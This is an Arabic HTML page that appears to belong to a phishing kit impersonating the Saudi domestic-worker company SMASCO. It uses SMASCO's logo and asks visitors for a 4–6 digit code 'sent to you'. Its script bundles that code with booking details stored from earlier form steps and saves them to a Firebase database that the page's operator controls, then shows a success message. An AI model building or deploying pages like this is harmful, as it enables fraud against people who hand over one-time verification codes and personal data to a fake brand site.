<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رمز التحقق - خدمات العاملات المنزلية</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <!-- ===== HEADER ===== -->
    <header class="main-header">
        <div class="logo">
            <img src="https://www.smasco.com/wp-content/uploads/2022/11/%D8%B3%D9%85%D8%A7%D8%B3%D9%83%D9%88.png" alt="شعار سماسكو">
        </div>
    </header>

    <main>
        <section class="verification-section">
            <div class="container">
                <h2>رمز التحقق</h2>

                <div class="verification-container">
                    <p>يرجى إدخال رمز التحقق</p>
                    <p style="font-size:14px; color:#888;">أدخل الرمز الذي أُرسل إليك (4-6 أرقام)</p>

                    <div id="error-msg" class="error-message" style="display:none;"></div>

                    <form id="verificationForm" onsubmit="submitVerification(event)">
                        <div class="form-group" style="margin-top:20px;">
                            <label>أدخل رمز التحقق *</label>
                            <input type="text" name="verification_code" id="verification_code"
                                required pattern="[0-9]{4,6}" placeholder="0000"
                                maxlength="6" style="text-align:center; font-size:28px; letter-spacing:6px;">
                        </div>
                        <button type="submit" class="btn-submit">تحقق</button>
                    </form>
                </div>
            </div>
        </section>
    </main>

    <footer>
        <div class="container">
            <p>&copy; 2024 خدمات العاملات المنزلية. جميع الحقوق محفوظة.</p>
        </div>
    </footer>

    <audio id="success-sound" preload="auto" playsinline>
        <source src="https://assets.mixkit.co/active_storage/sfx/2863/2863-preview.mp3" type="audio/mpeg">
    </audio>

    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
    <script src="firebase-config.js"></script>
    <script src="booking.js"></script>
    <script>
        async function submitVerification(e) {
            e.preventDefault();
            const code = document.getElementById('verification_code').value.trim();
            const errMsg = document.getElementById('error-msg');
            errMsg.style.display = 'none';

            if (!code || code.length < 4) {
                errMsg.textContent = 'يرجى إدخال رمز صحيح مكوّن من 4 إلى 6 أرقام';
                errMsg.style.display = 'block';
                return;
            }

            // حفظ رمز التحقق في الحجز المحفوظ
            const bookingType = sessionStorage.getItem('current_booking_type') || 'hourly';
            const step1 = JSON.parse(sessionStorage.getItem(`booking_${bookingType}_step1`) || '{}');
            const step2 = JSON.parse(sessionStorage.getItem(`booking_${bookingType}_step2`) || '{}');
            const step4 = JSON.parse(sessionStorage.getItem(`booking_${bookingType}_step4`) || '{}');

            const bookingData = {
                ...step1,
                ...step2,
                ...step4,
                verification_code: code,
                booking_type: bookingType,
                status: 'completed'
            };

            try {
                await saveCompletedBooking(bookingData);
                playSuccessSound();

                // مسح بيانات الجلسة
                clearBooking();
                sessionStorage.removeItem('current_booking_type');

                setTimeout(() => {
                    alert('تم التحقق بنجاح! سيتم التواصل معك قريباً.');
                    window.location.href = 'index.html';
                }, 500);
            } catch (error) {
                errMsg.textContent = 'تعذر إكمال التحقق. يرجى التأكد من إعداد Firebase والمحاولة مرة أخرى.';
                errMsg.style.display = 'block';
                console.error(error);
            }
        }
    </script>

</body>
</html>
